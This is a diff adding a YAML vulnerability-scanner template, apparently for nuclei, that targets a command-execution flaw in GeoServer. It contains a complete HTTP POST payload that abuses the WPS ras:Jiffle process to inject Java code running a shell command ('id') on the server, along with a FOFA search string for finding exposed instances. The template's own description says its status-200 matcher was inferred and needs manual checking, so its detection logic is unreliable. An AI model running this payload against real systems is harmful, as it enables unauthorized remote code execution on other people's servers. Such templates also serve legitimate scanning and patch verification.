@@ -1,0 +1,21 @@
+id: poc-va2k90e90pcup00u
+info:
+  name: Geoserver存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/va2k90e90pcup00u
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: va2k90e90pcup00u
+    fofa: '"geoserver"'
+http:
+- raw:
+  - "POST /geoserver/wms HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\nAccept-Encoding: gzip, deflate\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n  <wps:Execute version=\"1.0.0\" service=\"WPS\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"http://www.opengis.net/wps/1.0.0\" xmlns:wfs=\"http://www.opengis.net/wfs\" xmlns:wps=\"http://www.opengis.net/wps/1.0.0\" xmlns:ows=\"http://www.opengis.net/ows/1.1\" xmlns:gml=\"http://www.opengis.net/gml\" xmlns:ogc=\"http://www.opengis.net/ogc\" xmlns:wcs=\"http://www.opengis.net/wcs/1.1.1\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" xsi:schemaLocation=\"http://www.opengis.net/wps/1.0.0 [http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd\">](http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd%22%3E)\n    <ows:Identifier>ras:Jiffle</ows:Identifier>\n    <wps:DataInputs>\n      <wps:Input>\n        <ows:Identifier>coverage</ows:Identifier>\n        <wps:Data>\n          <wps:ComplexData mimeType=\"application/arcgrid\"><![CDATA[ncols 720 nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999  316]]></wps:ComplexData>\n        </wps:Data>\n      </wps:Input>\n      <wps:Input>\n        <ows:Identifier>script</ows:Identifier>\n        <wps:Data>\n          <wps:LiteralData>dest = y() - (500); // */ public class Double {    public static double NaN = 0;  static { try {  java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"id\").getInputStream())); String line = null; String allLines = \" - \"; while ((line = reader.readLine()) != null) { allLines += line; } throw new RuntimeException(allLines);} catch (java.io.IOException e) {} }} /**</wps:LiteralData>\n        </wps:Data>\n      </wps:Input>\n      <wps:Input>\n        <ows:Identifier>outputType</ows:Identifier>\n        <wps:Data>\n          <wps:LiteralData>DOUBLE</wps:LiteralData>\n        </wps:Data>\n      </wps:Input>\n    </wps:DataInputs>\n    <wps:ResponseForm>\n      <wps:RawDataOutput mimeType=\"image/tiff\">\n        <ows:Identifier>result</ows:Identifier>\n      </wps:RawDataOutput>\n    </wps:ResponseForm>\n  </wps:Execute>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
